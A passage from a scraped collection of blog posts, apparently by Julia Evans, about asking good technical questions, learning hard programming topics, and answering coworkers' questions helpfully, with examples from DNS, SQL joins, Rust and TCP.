clarify my own thoughts – sometimes by the time I’m done I’ve\nanswered my own question :) \n\n Stating your understanding is a kind of yes/no\nquestion – “this is my understanding of how X works, is that right or wrong?”.\nOften the answer is going to be “right in some ways and wrong in others”, but\neven so it makes the job of the answerer a lot easier. \n\n Okay! Now let’s talk about interrupting a little bit. \n\n be willing to interrupt \n\n If someone goes off on a very long explanation that isn’t helping me at all, I\nthink it’s important to interrupt them. This can feel rude, but ultimately it’s\nmore efficient for everyone – it’s a waste of both their time and my time to\ncontinue. \n\n Usually I’ll interrupt by asking a more specific question, because usually if\nsomeone has gone off on a long irrelevant explanation it’s because I asked an\noverly vague question to start with. \n\n don’t accept responses that don’t answer your question \n\n If someone finishes a statement that doesn’t answer you question, it’s\nimportant not to leave it there! Keep asking questions! \n\n a couple of ways you can do this: \n\n \n ask a much more specific question (like a yes/no question) that’s in the direction of what you actually wanted to know \n ask them to clarify some terminology you didn’t understand (what’s an X?) \n \n\n take a minute to think \n\n Sometimes when asking someone a question, they’ll tell me new information\nthat’s really surprising. For example, I recently learned that Javascript\nasync/await isn’t implemented with coroutines (I thought it was because AFAIK Python\nasync/await is implemented with coroutines). \n\n I was pretty surprised by this, and I really needed to stop and think about\nwhat the implications of that were and what other questions I had about how\nJavascript works based on that new piece of information. \n\n If this happens in a real-time conversation sometimes I’ll literally say\nsomething like “wait, that’s surprising to me, let me think for a minute” and\ntry to incorporate the new data and come up with another question. \n\n it takes a little bit of confidence \n\n All of these things – being willing to interrupt, not accepting responses that\ndon’t answer your questions, and asking for a minute to think – require a\nlittle bit of confidence! \n\n In the past when I’ve struggled with confidence, I’ve sometimes thought “oh,\nthis explanation is probably really good, I’m just not smart enough to\nunderstand it”, and kind of accepted it. And even today I sometimes find it\nhard to keep asking questions when someone says a lot of words I don’t\nunderstand. \n\n It helps me to remember that: \n\n \n people usually want to help (even if their first explanation was full of confusing jargon) \n if I can get even 1 useful piece of information by the end of the\nconversation, it’s a victory (like the answer to a yes/no question that I\npreviously didn’t know the answer to) \n \n\n One of the reasons I dislike a lot of “how to ask questions” advice out there\nis that it actually tries to  undermine  the reader’s confidence – the\nassumption is that the people answering the questions are Super Smart Perfect\nPeople and you’re probably wasting their time with your dumb questions. But in\nreality (at least when at work) your coworkers answering the questions are\nprobably smart well-meaning people who want to help but aren’t always able to\nanswer questions very clearly, so you need to ask follow up questions to get\nanswers. \n\n how to give useful answers \n\n There’s also a lot you can do to try not to be the person who goes off on a\nlong explanation that doesn’t help the person you’re talking to at all. \n\n I wrote about this already in  how to answer question in a helpful\nway , but the main thing I do is\npause periodically and check in. I’ll often say something like “does that make\nsense?“. (though this doesn’t always work, sometimes people will say “yes” even\nif they’re confused) \n\n It’s especially important to check in if: \n\n \n You haven’t explained a concept before (because your initial explanation will probably not be very good) \n You don’t know the person you’re talking to very well (because you’ll probably make incorrect assumptions about what they know / don’t know) \n \n\n being good at extracting information is a superpower \n\n Some developers know a lot but aren’t very good at explaining what they know.\nI’m not trying to make a value judgement about that here (different people have\ndifferent strengths! explaining things is extremely hard to do well!). \n\n I’ve found that instead of being mad that some people aren’t great at\nexplaining things, it’s more effective for me to get better at asking\nquestions that will get me the answers I need. \n\n This really expands the set of people I can learn from – instead of finding\nsomeone who can easily give a clear explanation, I just need to find  someone \nwho has the information I want and then ask them specific questions until I’ve\nlearned what I want to know. And I’ve found that most people really do want to\nbe helpful, so they’re very happy to answer questions. \n\n And if you get good at asking questions, you can often find a set of questions\nthat will get you the answers you want pretty quickly, so it’s a good use of\neveryone’s time! \n\n"},
{"url": "https://jvns.ca/blog/2016/08/31/asking-questions/", "title": "Asking good questions is hard (but worth it)", "content": "\n     \n\n I just read this wonderful article by Duretti Hirpa “ Confronting Jargon\n ” which talks about (among other things) asking questions and not knowing things at work. \n\n One thing about asking questions that I think doesn’t always get enough\nappreciation is that asking good questions is a  skill . It’s something that\nyou can practice and get better at. \n\n Asking questions is super hard. Sometimes if there’s a topic I’m really\nconfused about, I need to concentrate for like 10 minutes to actually come up\nwith a more coherent question that “what? I don’t get it?”. \n\n Every month or two, I go to the Papers We Love meetup in Montreal, where\npeople present on computer science papers they loved. And every meetup, the\norganizer starts by saying “this is a meant to be a discussion, please feel\nfree to ask questions, even stupid questions”. \n\n The last paper was about compiler optimizations (“the nanopass compiler”)! The\npresenter (who did a great job) started out by talking about how when Erlang\ncompiler compiles your Erlang into bytecode, it goes through 5 phases (erlang\nsource, the AST, some intermediate representation, some other intermediate\nrepresentation, bytecode). I knew that other compilers had less intermediate\nrepresentations, so I asked why Erlang was different! He said it helped them do\nmore compiler optimizations. \n\n I really like asking questions at meetups like this because I get to learn\nabout cool computer science papers, and I think asking relatively basic\nquestions helps other people see that they can also ask! Usually I try to ask\na couple of questions early on and then if I see that other people are asking\nlots of questions I stop unless I have something I really want to\nknow. \n\n some questions are better than others \n\n Finding questions to ask that get people to tell you AMAZING THINGS isn’t\nalways easy. But sometimes I stumble upon MAGICAL QUESTIONS that unearth\nhidden huge amounts of knowledge. For example! The question\n Why do we use the Linux kernel’s TCP stack?  resulted in: \n\n \n a great post on the Cloudflare blog  Why we use the Linux kernel’s TCP stack \n some quite good  comments on HN \n \n\n So! Given that many questions don’t result in interesting new knowledge (“is\nvim or emacs better?” being perhaps the worst offender), how do we find ones\nthat are good? Here are some ideas for questions to ask. \n\n Summarize your understanding \n\n “how does X work?” is actually a really hard question to answer. The answerer has to figure out\nwhat you already know about how X works, and what else you might need to know,\nand maybe X is really complicated and they only have 10 minutes right now, and… \n\n When I’m trying to get someone to explain a system to me at work, I like to\nstart by explaining my current understanding to them. This can look like \n\n \n me: so, we have 2 different DNS servers, right? \n them: oh actually we have 3! \n me: oh! what is the third one? \n \n\n I really like this because it helps reveal misunderstandings I have (me: “so,\nthe 2 most important things about $system are A and B?” them: “the most\nimportant thing is probably actually W”). \n\n be humble & curious \n\n There’s this really delightful post by Erin Ptacek called  “be coachable”  about learning roller derby in her 40s. I think about this post a lot when someone who knows a lot more than me is trying to teach me a thing. \n\n Every so often I will be asking questions about a THING and someone will say\n(in a nice way!!) “Julia, you do not know how this thing works. You need to\nlearn how it works and then everything will be a lot more clear.” For instance\nI used to work with Hadoop and for a while I had NO IDEA how Hadoop worked.\nWhen I learned the basic Hadoop computation model everything got a lot easier. \n\n When I discover yet another new thing that I need to know that I know\npractically nothing about, sometimes it feels embarrassing! I sometimes feel\nlike “ugh, I’m practically 30, and I started learning to program when I was\n15, and will I ever learn how computers work?” \n\n The answer is probably that no, there will always be new computer things to\nlearn. And I mostly like that, even if I feel dumb sometimes! When I find out\nthat I don’t know an Important Thing that apparently everybody except me knew\nI just take a deep breath and am like WELL I GUESS TODAY IS THE DAY I’M GOING\nTO LEARN IT THEN. And the people are never jerks about it, because they all\nhave stuff that they don’t know, and it’s normal. \n\n These days I’m learning a lot faster than I was when I was 15, so that’s\nsomething :). Having a ton of awesome people to learn (hi, coworkers. hi,\ninternet) from makes a huge difference. \n\n How does THING work? \n\n I said before that “How does X work?” isn’t the best question. But I do like\nto ask about how things work. \n\n One thing I really like to do on this blog is to write a small explanation\nabout how something works (“here are the first 5 things to know!”), and then\npeople often respond with a lot of extra interesting information that I didn’t\nknow. \n\n For example,  how does strace work?   SQLite?   gzip? . \n\n Is THING hard? Why is THING hard? \n\n Some things are surprisingly hard (for instance,  benchmarking, printing floating point numbers , and getting people to work together effectively). Some other things are surprisingly easy! Like training a machine learning model is a complicated thing but actually logistic regression is pretty simple and sometimes it all Just Works. \n\n It’s a really common saying that “there are two hard problems in programming – cache invalidation and naming things”. But why is cache invalidation hard, actually? What kinds of things normally go wrong? \n\n It turns out that writing a really basic TCP stack (enough to let you get a website) is  surprisingly easy , something you can do in about a week, and once you know that, it turns out that writing a TCP stack that can actually handle the range of traffic you see on the internet is  surprisingly hard . \n\n Once you learn more about which things are hard and which things are easy, you\ncan make more informed decisions about what projects to jump into, which is\nthe best. \n\n What did THING look like when it first existed? \n\n I once needed to write an introduction to the Stripe API for new Stripe\nemployees. We ended up looking at the very first commit to the main repository\nand seeing what it said. It turned out to be a surprisingly good introduction\nto the codebase – some of the core objects hadn’t really changed since the\nfirst commit. \n\n Often asking questions about the history of something really helps me\nunderstand how it came to be where it is today. \n\n What happens if you poke THING with a stick? \n\n One of my very favorite kinds of questions to ask / things to investigate is – what if you take a normal thing, and do something weird to it? For example! Kamal has a really great talk called  Storing your data in kernel space  where he puts a bunch of data inside pipe buffers in the kernel. This is not a normal thing to do. \n\n It turns out when you use a lot of memory in this way, the Linux kernel will start killing processes. This is called the OOM killer! Creating weird edge cases on systems that aren’t important gives you a better sense of the edges of your system and how the underlying things work, which sometimes is Extremely Useful.  Rachel By The Bay  is a great blog that talks about a lot of weird edge cases. \n\n Why is THING slow? \n\n Performance benchmarking/analysis is a really fun rabbit hole, that can\nunearth a lot of really weird behavior and interesting facts. \n\n Investigating performance problems has taught me about  Java garbage collection  and  TCP_NODELAY  and a bunch of other things. \n\n And then often if I tell someone a performance story, they will tell me their\nstories and I’ll learn something new! \n\n partial answers = amazing \n\n I really frequently ask a question and provide a partial answer to give people\nan idea of what I’m looking for. Often people will chime in with (“oh, you\nmissed this! you didn’t mention [amazing thing]“). And then I learn SO MUCH! \n\n asking questions is a service \n\n And asking questions can be a huge service to other people. I sometimes review\nother people’s talks and writing, and one of my favorite ways to do it is just\nto give them questions that they haven’t answered that I think might help\ntheir reader. Then they can decide if that’s a question they want to address\nor not! \n\n Once I wrote a guest blog post on Cathy O’Neil’s blog. She is hella good at\nasking questions, and I didn’t know what to write, and she sent me a list of 5\nquestions she thought it would be useful for me answer in my post. Then\nsuddenly writing the guest blog post was SUPER EASY. \n\n Or sometimes I’ll be in a meeting, and somebody will ask a super incisive\nquestion that frames the problem in a way I hadn’t thought about before and\nit’ll totally change the way I think about everything. \n\n practice helps. \n\n I think it’s really fun and it’s been super valuable to me at work. \n\n The more questions I ask, the better I get at asking questions that move the\nconversation forward, that teach me (and other people!) something new, or\nthat help someone clarify what they’re saying. \n\n And I think I’m getting better! One of my coworkers told me recently “julia,\nyou ask really good questions. I always want to take the time to answer them\nproperly” <3. \n\n"},
{"url": "https://jvns.ca/blog/2013/02/24/trying-out-octopress/", "title": "Trying out Octopress", "content": "\n      Decided that I was tired of messing with HTML and CSS and layouts to set up\nJekyll, so trying out Octopress here instead. So far it’s really easy to set\nup and looks okay so appears to be a win so far. Still need to figure how to\nmake it more orange. \n\n"},
{"url": "https://jvns.ca/blog/good-questions/", "title": "How to ask good questions", "content": "\n     \n\n Asking good questions is a super important skill when writing software.\nI’ve gotten way better at it over the years (to the extent that it’s something\nmy coworkers comment on a lot). Here are a few guidelines that have worked well\nfor me! \n\n \n \n \n\n asking bad questions is ok \n\n I’m actually kind of a big believer in asking dumb questions\nor questions that aren’t “good”. I ask people kind of dumb\nquestions all the time, questions that I could have answered\nwith Google or by searching our codebase.  I mostly try not\nto, but sometimes I do it anyway and I don’t think it’s the\nend of the world. \n\n So this list of strategies isn’t about “here are all the things you have to do\nbefore asking a question, otherwise you are a bad person and should feel bad,\nbut rather “here are some things that have helped me ask better questions and\nget the answers I want!”. \n\n If someone is refusing to answer your questions unless they’re “good”, I wrote\na different blog post for them to read:\n How to answer questions in a helpful way \n\n what’s a good question? \n\n Our goal is going to be to ask questions about technical concepts that are\n easy to answer . I often have somebody with me who has a bunch of knowledge\nthat I’d like to know too, but they don’t always know exactly how to explain it\nto me in the best way. \n\n If I ask a good series of questions, then I can help the person explain what\nthey know to me efficiently and guide them to telling me the stuff I’m\ninterested in knowing. So let’s talk about how to do that! \n\n State what you know \n\n This is one of my favorite question-asking techniques! This kind of question\nbasically takes the form \n\n \n State what you understand about the subject so far \n Ask “is that right?” \n \n\n For example, I was talking to someone (a really excellent question asker) about\nnetworking recently! They stated “so, what I understand here is that there’s\nsome chain of recursive dns servers…”. That was not correct! There is actually\nno chain of recursive DNS servers. (when you talk to a recursive DNS server\nthere is only 1 recursive server involved) So them saying their understanding\nso far made it easy for us to clarify how it actually works. \n\n I was interested in rkt a while back, and I didn’t understand why rkt took up\nso much more disk space than Docker when running containers. \n\n “Why does rkt use more disk space than Docker” didn’t feel like the right question\nthough – I understood more or less  how  the code worked, but I didn’t\nunderstand  why  they wrote the code that way. So I wrote this question to the  rkt-dev  mailing list:\n Why does rkt store container images differently from Docker? . \n\n I \n\n \n wrote down my understanding of how both rkt and Docker store containers on disk \n came up with a few reasons I thought they might have designed it the way they did \n and just asked “is my understanding right?” \n \n\n The answer I got was super super helpful, exactly what I was looking for. It\ntook me quite a while to formulate the question in a way that I was happy with,\nand I’m happy I took the time because it made me understand what was happening\na lot better. \n\n Stating your understanding is not at all easy (it takes time to think about\nwhat you know and clarify your thoughts!!) but it works really well and it\nmakes it a lot easier for the person you’re asking to help you. \n\n Ask questions where the answer is a fact \n\n A lot of the questions I have start out kind of vague, like “How do SQL joins\nwork?”. That question isn’t awesome, because there are a lot of different parts\nof how joins work! How is the person even supposed to know what I’m interested\nin learning? \n\n I like to ask questions where the answer is a straightforward fact. For\nexample, in our SQL joins example, some questions with facts for answers might\nbe: \n\n \n What’s the time complexity of joining two tables of size N and M? Is it O(NM)? O(NlogN) + O(MlogM)? \n Does MySQL always sort the join columns as a first step before doing the join? \n I know that Hadoop sometimes does a “hash join” – is that a joining strategy that other database engines use too? \n When I do a join between one indexed column and one unindexed column, do I need to sort the unindexed column? \n \n\n When I ask super specific questions like this, the person I’m asking doesn’t\nalways know the answer (which is fine!!) but at least they understand the\n kind  of question I’m interested in – like, I’m obviously not interested in\nknowing how to  use  a join, I want to understand something about the\nimplementation details and the algorithms. \n\n Be willing to say what you don’t understand \n\n Often when someone is explaining something to me, they’ll say something that I\ndon’t understand. For example, someone might be explaining something about\ndatabases to me and say “well, we use optimistic locking with MySQL, and so…”.\nI have no idea what “optimistic locking” is. So that would be a good time to\nask! :) \n\n Being able to stop someone and say “hey, what does that mean?” is a super\nimportant skill. I think of it as being one of the properties of a confident\nengineer and an awesome thing to grow into. I see a lot of senior\nengineers who frequently ask for clarifications – I think when you’re more\nconfident in your skills, this gets easier. \n\n The more I do this, the more comfortable I feel asking someone to clarify. in\nfact, if someone  doesn’t  ask me for clarifications when I’m explaining\nsomething, I worry that they’re not really listening! \n\n This also creates space for the question  answerer  to admit when they’ve\nreached the end of their knowledge! Very frequently when I’m asking someone\nquestions, I’ll ask something that they don’t know. People I ask are usually\nreally good at saying “nope, I don’t know that!” \n\n Identify terms you don’t understand \n\n When I started at my current job, I started on the data team. When I started\nlooking at what my new job entailed, there were all these words! Hadoop,\nScalding, Hive, Impala, HDFS, zoolander, and more. I had maybe heard of Hadoop\nbefore but I didn’t know what basically any of these words meant. Some of the\nwords were internal projects, some of them were open source projects. So I\nstarted just by asking people to help me understand what each of the terms\nmeant and the relationships between them. Some kinds of questions I might have\nasked: \n\n \n Is HDFS a database? (no, it’s a distributed file system) \n Does Scalding use Hadoop? (yes) \n Does Hive use Scalding? (no) \n \n\n I actually wrote a ‘dictionary’ of all the terms because there were so many of them, and understanding what all the terms meant really helped me orient myself and ask better questions later on. \n\n Do some research \n\n When I was typing up those SQL questions above, I typed “how are sql\njoins implemented” into Google. I clicked some links, saw “oh, I see, sometimes\nthere is sorting, sometimes there are hash joins, I’ve heard about those”, and\nthen wrote down some more specific questions I had. Googling a little first\nhelped me write slightly better questions! \n\n That said, I think people sometimes harp too much on “never ask a question\nwithout Googling it first” – sometimes I’ll be at lunch with someone and I’ll\nbe curious about their work, and I’ll ask them some kind of basic questions\nabout it. This is totally fine! \n\n But doing research is really useful, and it’s actually really fun to be able to\ndo enough research to come up with a set of awesome questions. \n\n Decide who to ask \n\n I’m mostly talking here about asking  your coworkers  questions,\nsince that’s where I spend most of my time. \n\n Some calculations I try to make when asking my coworkers questions are: \n\n \n is this a good time  for this person? (if they’re in the middle of a stressful thing, probably not) \n will asking them this question save me as much time as it takes them?\n(if I can ask a question that takes them 5 minutes to answer, and will\nsave me 2 hours, that’s excellent :D) \n How much time will it take them  to answer my questions? If I have half an hour of questions to ask, I might want to schedule a block of time with them later, if I just have one quick question I can probably just ask it right now. \n Is this person too senior for this question? I think it’s kind of easy to fall into the trap of asking the most experienced / knowledgeable person every question you have about a topic. But it’s often actually better to find someone who’s a little less knowledgeable – often they can actually answer most of your questions, it spreads the load around, and they get to showcase their knowledge (which is awesome). \n \n\n I don’t always get this right, but it’s been helpful for me to think about\nthese things. \n\n Also, I usually spend more time asking people who I’m closer to questions –\nthere are people who I talk to almost every day, and I can generally ask them\nquestions easily because they have a lot of context about what I’m working on\nand can easily give me a helpful answer. \n\n How to ask questions the smart way by ESR \nis a popular and pretty hostile document (it starts out poorly with\nstatements like ‘We call people like this “losers”’, and doesn’t get much better). It’s also about  asking questions\nto strangers on the internet . Asking strangers on the internet\nquestions is a super useful skill and can get you really useful information,\nbut it’s also the “hard mode” of asking questions. The person you’re talking to\nknows very little about your situation, so it helps to be proportionally more\ncareful about stating what exactly you want to know. I think\n“How to ask questions the smart way” puts an extremely unreasonable burden on\nquestion-askers (it says that someone should exhaust every\nother possible option to get the information they want before asking a question otherwise they’re a “lazy sponge”), but the “How To Answer Questions in a Helpful Way”\nsection is good. \n\n Ask questions to show what’s not obvious \n\n A more advanced form of question asking is asking questions to reveal hidden\nassumptions or knowledge. This kind of question actually has two\npurposes – first, to get the answers (there is probably information one person\nhas that other people don’t!) but also to point out that there  is  some hidden\ninformation, and that sharing it is useful. \n\n The “The Art of Asking Questions” section of the\n Etsy’s Debriefing Facilitation Guide \nis a really excellent introduction to this, in the context of discussing an\nincident that has happened. Here are a few of the questions from that guide: \n\n \n “What things do you look for when you suspect this type of failure happened?” \n\n “How did you judge that this situation was ‘normal?” \n\n How did you know that the database was down? \n\n How did you know that was the team you needed to page? \n \n\n These kinds of questions (that seem pretty basic, but are not actually obvious)\nare especially powerful when someone who’s in a position of some authority asks\nthem. I really like it when a manager / senior engineer asks a basic but\nimportant question like “how did you know the database was down?” because it\ncreates space for less-senior people to ask the same kinds of questions later. \n\n Answer questions. \n\n One of my favorite parts of  André Arko’s great How to Contribute to Open Source post \nis where he says \n\n \n Now that you’ve read all the issues and pull requests, start to watch for\nquestions that you can answer. It won’t take too long before you notice that\nsomeone is asking a question that’s been answered before, or that’s answered\nin the docs that you just read. Answer the questions you know how to answer. \n \n\n If you’re ramping up on a new project,  answering  questions from people who\nare learning the stuff you just learned can be a really awesome way to solidify\nyour knowledge. Whenever I answer a question about a new topic for the first\ntime I always feel like “omg, what if I answer their question wrong, omg”. But\nusually I can answer their question correctly, and then I come away feeling\nawesome and like I understand the subject better! \n\n Questions can be a huge contribution \n\n Good questions can be a great contribution to a community! I asked a bunch of\nquestions about CDNs a while back on twitter and wrote up the answers in  CDNs aren’t just for caching . A lot of\npeople told me they really liked that blog post, and I think that me asking\nthose questions helped a lot of people, not just me. \n\n A lot of people really like answering questions! I think it’s important to\nthink of good questions as an awesome thing that you can do to add to the\nconversation, not just “ask good questions so that people are only a little\nannoyed instead of VERY annoyed”. \n\n \nThanks to Charity Majors for reminding me that I have something to say about\nasking questions, and to Jeff Fowler & Dan Puttick for talking about this with\nme!\n \n\n"},
{"url": "https://jvns.ca/blog/2018/09/01/learning-skills-you-can-practice/", "title": "How to teach yourself hard things", "content": "\n     \n\n This blog is mostly about learning computer programming / systems. Probably 70% of these posts are\nin one way or another about things I’ve learned and why they’re exciting. \n\n But how do you teach yourself hard things? I’ve talked before about having a growth mindset, which is about replacing the belief “I’m bad at X” with “I haven’t learned about X yet”. \n\n Having a positive attitude is really important, but IMO by itself it’s not enough to learn hard\nthings. Learning is a skill which takes a lot of work to get better at. So this blog post is about\nspecific learning skills that I’ve worked on over time. They are: \n\n \n Identify what you don’t understand (maybe the most important one) \n Have confidence in your knowledge \n Ask questions \n Do research \n \n\n what does learning how to learn look like? \n\n Before we start, I want to talk a bit about what learning how to learn can look like. I’m not a\nteacher or anything, but here are a few things that I think helped me: \n\n \n when I was a kid, I spent 7 years doing a math program called  Kumon  which is really focused on learning math independently. I learned all of elementary/high school math that way. (from multiplication to algebra to calculus). I think this was pretty important and I owe a lot to my mom (who has now been helping kids learn independently for > 20 years!!) for making sure I got good at learning when I was a kid. \n did a pure math degree, where having a clear sense of what I understand and don’t understand was\nsuper important \n went to the  recurse center  which is a community of self-directed learners \n I work as a programmer, where as we know teaching yourself new things is an essential skill :) \n \n\n I think other ways people frequently get better at teaching themselves are: \n\n \n do a PhD (where it’s also necessary) \n be homeschooled / go to a school where learning is more self-led \n \n\n It seems a bit weird to put “learn some math independently when you’re 8” alongside “do a PhD” but\nto me figuring out fractions on your own feels like the same kind of mental discipline that’s useful\nas an adult researcher exploring new ideas. \n\n I’m going to avoid talking about math for the rest of this post because today I spend most of my\ntime learning programming ideas, not math ideas. So let’s talk about some learning skills! \n\n Learning skill: Identify what you don’t understand \n\n I think this is the most important learning skill. This is the skill of translating “I’m\nconfused, I don’t get it” to “I have a specific question about X”. \n\n For example, when I was learning Rust last winter, I felt really confused about references &\nborrowing. It took me a while to figure out why, but eventually I realized that I didn’t know the\nanswers to the following questions: (answered in  What’s a reference in Rust? ) \n\n \n What does the  &  symbol in Rust actually mean? \n How can I tell if a variable in Rust is allocated on the stack vs the heap? Is it always possible\nto tell? \n How can I avoid putting lifetimes on my Rust structs? \n \n\n Once I understood the answers to these, I had a MUCH stronger understanding of how to use references\nand borrowing and was permanently less confused about how to write Rust code. \n\n identifying what you don’t understand is important (but hard) \n\n Being good at this is a HUGE DEAL! If I weren’t good at figuring out what I’m confused about, then\nI’d either need to: \n\n \n get someone to identify those things  for  me, which is pretty unlikely to happen. \n find a course / blog post / book where someone’s already broken up the confusing things into the right pieces for me \n just decide not to learn hard/confusing things (which would be a disaster!!) \n \n\n Even though I think I’m pretty good at it now, I still find breaking down “I’m confused about X”\ninto specific questions about X takes work. For example, I only came up with those questions about\nRust references 3 years after I’d first used Rust. The reason it took so long is that I had to\ndecide to actually sit down, notice what I found confusing, and focus on figuring out what I was\nconfused about. That takes time! \n\n But I do think that this is something that you can get better at over time. I’m  much  better at\nbreaking down what’s confusing to me about a programming thing than I was and much more able to\nunstick myself. \n\n Learning skill: Have confidence in your knowledge \n\n Identifying what you  do  understand is IMO just as important as identifying what you don’t\nunderstand. For example, I don’t know everything about networking. One thing I do 100% know is that\nthere are 65535 TCP ports. That is definitely true. The src/dest port fields in the TCP header are\n16 bits (2^16=65536), so there is no room for more ports. \n\n Having pieces of knowledge that I’m really confident about is really important when trying to figure\nout a tricky problem. For example, imagine a program printed out “port 1823832” in a log. That is\nnot because there are secretly port numbers can be bigger than 65535 and I’ve just misunderstood!\nThat’s because there’s a bug in the program, there’s no port 1823832. That’s kind of a silly example,\nbut I need to debug complicated issues all the time and it would be a huge waste of time to second\nguess things that I do actually know. \n\n Taking a bit of extra time to take a piece of knowledge that you’re pretty sure of (“there are 65535\nports, Wikipedia said so”) and make it totally ironclad (“that’s because the port field in the TCP\nheader is only 16 bits”) is super useful because there is a big difference between “I’m 97% sure\nthis is true” and “I am 100% sure about this and I never need to question it again”. Things I know\nare 100% true are way easier to rely on. \n\n Learning skill: Ask questions \n\n The next skill is “ask questions”. This is about taking the things you’ve identified that you’re\nconfused about (“what’s the difference between TLS 1.3 and 1.2?”) and turning them into questions to\nask a person. \n\n Here I’m just going to link to a post I previously wrote called\n How to ask good questions . \n\n The hardest part of asking questions for me is actually figuring out what I do and don’t know. I\nthink there are also some interesting skills here about: \n\n \n finding Slack groups / IRC channels / email lists who can help you \n mailing list etiquette \n asking questions on Stack Overflow (which I’ve never done successfully) \n \n\n Learning skill: Do research! \n\n This is about: \n\n \n being good at Googling \n knowing where the best documentation is in your area \n reading mailing list archives \n having / finding books that have the information you need. Not all information is on Stack\nOverflow! If I’m confused about a Linux concept I’ll often reach for  the linux programming interface  instead of Googling. \n reading the source code when Google/books/the docs can’t answer your questions \n \n\n I’m not aware of any good guides to doing tech research, though I think that could be a really\ninteresting thing to write up – information about different areas is available in dramatically\ndifferent places (man pages? books? mailing lists?) and some documentation is MUCH better than other\nthan other documentation. How do you figure out the landscape of where information is in your area? \n\n Learning skill: Recognize that being confused means you’re about to learn something \n\n One last thing that has been important for me is to recognize when I’m confused about something and,\ninstead of feeling bad (“oh no! I don’t know this thing! disaster!”), recognize that it’s a normal\nfeeling and that it just means I’m about to learn something! \n\n I  like  learning! It’s fun! So if I’m confused, that’s usually a good thing because it means I’m\nnot stagnating. Here’s how I approach it: \n\n \n recognize that I’m confused \n figure out what the topic I’m confused about is \n turn that confusion into concrete questions \n ask someone or research to get the answers \n I’ve learned something new!! Hooray! \n \n\n Of course, I don’t do that  every  time I’m confused about something – sometimes I just note “ah,\nI’m confused about X, maybe I will figure that out someday but not today”. That’s okay too! Learning\nis a lifetime project :) \n\n working on learning skills makes a huge difference \n\n I don’t really think I could have a career as a programmer if I didn’t invest in learning new\nthings. Almost everything I do in my job day-to-day is something I learned on my own, and most of it\nis stuff that I learned  recently  (in the last 2-3 years). So it makes sense for me to continue\nworking on getting better at learning. Some learning skills I’d like to be better at are: \n\n \n figuring out when it’s appropriate to use a mailing list to ask a question and asking the right\nquestions there \n taking a large / complex piece of open source documentation and determining what information is in\nit and what isn’t \n using open source Slack/IRC groups effectively \n finding great reference books that I can lean on \n \n\n"},
{"url": "https://jvns.ca/blog/answer-questions-well/", "title": "How to answer questions in a helpful way", "content": "\n     \n\n Your coworker asks you a slightly unclear question. How do you answer? I think asking questions\nis a skill (see  How to ask good questions ) and that answering questions\nin a helpful way is also a skill! Both of them are super useful. \n\n To start out with – sometimes the people asking you questions don’t respect\nyour time, and that sucks. I’m assuming here throughout that that’s not what\nhappening – we’re going to assume that the person asking you questions is a\nreasonable person who is trying their best to figure something out and that you\nwant to help them out. Everyone I work with is like that and so that’s the\nworld I live in :) \n\n Here are a few strategies for answering questions in a helpful way! \n\n If they’re not asking clearly, help them clarify \n\n Often beginners don’t ask clear questions, or ask questions that don’t have the necessary information to answer the questions. Here are some strategies you can use to help them clarify. \n\n \n Rephrase a more specific question  back at them (“Are you asking X?”) \n Ask them for more specific information  they didn’t provide (“are you using IPv6?”) \n Ask what prompted their question . For example, sometimes people come into my team’s channel with questions about how our service discovery works. Usually this is because they’re trying to set up/reconfigure a service. In that case it’s helpful to ask “which service are you working with? Can I see the pull request you’re working on?” \n \n\n A lot of these strategies come from the  how to ask good questions  post. (though I would never\nsay to someone “oh you need to read this Document On How To Ask Good Questions\nbefore asking me a question”) \n\n Figure out what they know already \n\n Before answering a question, it’s very useful to know what the person knows already! \n\n Harold Treen gave me a great example of this: \n\n \n Someone asked me the other day to explain “Redux Sagas”. Rather than dive in and say “They are like worker threads that listen for actions and let you update the store!”  \nI started figuring out how much they knew about Redux, actions, the store and all these other fundamental concepts. From there it was easier to explain the concept that ties those other concepts together. \n \n\n Figuring out what your question-asker knows already is important because they may\nbe confused about fundamental concepts (“What’s Redux?”), or they may be an\nexpert who’s getting at a subtle corner case. An answer building on concepts\nthey don’t know is confusing, and an answer that recaps things they know is\ntedious. \n\n One useful trick for asking what people know – instead of “Do you know X?”,\nmaybe try “How familiar are you with X?”. \n\n Point them to the documentation \n\n “RTFM” is the classic unhelpful answer to a question, but pointing someone to a\nspecific piece of documentation can actually be really helpful! When I’m asking\na question, I’d honestly rather be pointed to documentation that actually\nanswers my question, because it’s likely to answer other questions I have too. \n\n I think it’s important here to make sure you’re linking to documentation that\nactually answers the question, or at least check in afterwards to make sure it\nhelped. Otherwise you can end up with this (pretty common) situation: \n\n \n Ali: How do I do X? \n Jada: <link to documentation> \n Ali: That doesn’t actually explain how to X, it only explains Y! \n \n\n If the documentation I’m linking to is very long, I like to point out the\nspecific part of the documentation I’m talking about. The  bash man page  is 44,000 words (really!), so just\nsaying “it’s in the bash man page” is not that helpful :) \n\n Point them to a useful search \n\n Often I find things at work by searching for some Specific Keyword that I know will find me the answer. That keyword might not be obvious to a beginner! So saying “this is the search I’d use to find the answer to that question” can be useful. Again, check in afterwards to make sure the search actually gets them the answer they need :) \n\n Write new documentation \n\n People often come and ask my team the same questions over and over again. This is obviously not the fault of the people (how should  they  know that 10 people have asked this already, or what the answer is?). So we’re trying to, instead of answering the questions directly, \n\n \n Immediately write documentation \n Point the person to the new documentation we just wrote \n Celebrate! \n \n\n Writing documentation sometimes takes more time than just answering the question, but it’s often worth it! Writing documentation is especially worth it if: \n\n a. It’s a question which is being asked again and again\nb. The answer doesn’t change too much over time (if the answer changes every week or month, the documentation will just get out of date and be frustrating) \n\n Explain what you did \n\n As a beginner to a subject, it’s really frustrating to have an exchange like this: \n\n \n New person: “hey how do you do X?” \n More Experienced Person: “I did it, it is done.” \n New person: ….. but what did you DO?! \n \n\n If the person asking you is trying to learn how things work, it’s helpful to: \n\n \n Walk them through how to accomplish a task instead of doing it yourself \n Tell them the steps for how you got the answer you gave them! \n \n\n This might take longer than doing it yourself, but it’s a learning opportunity\nfor the person who asked, so that they’ll be better equipped to solve such\nproblems in the future. \n\n Then you can have WAY better exchanges, like this: \n\n \n New person: “I’m seeing errors on the site, what’s happening?” \n More Experienced Person: (2 minutes later) “oh that’s because there’s a database failover happening” \n New person: how did you know that??!?!? \n More Experienced Person: “Here’s what I did!”:\n\n \n Often these errors are due to Service Y being down. I looked at $PLACE and it said Service Y was up. So that wasn’t it. \n Then I looked at dashboard X, and this part of that dashboard showed there was a database failover happening. \n Then I looked in the logs for the service and it showed errors connecting to the database, here’s what those errors look like. \n \n \n\n If you’re explaining how you debugged a problem, it’s useful both to explain how you found out what the problem was, and how you found out what the problem wasn’t. While it might feel good to look like you knew the answer right off the top of your head, it feels even better to help someone improve at learning and diagnosis, 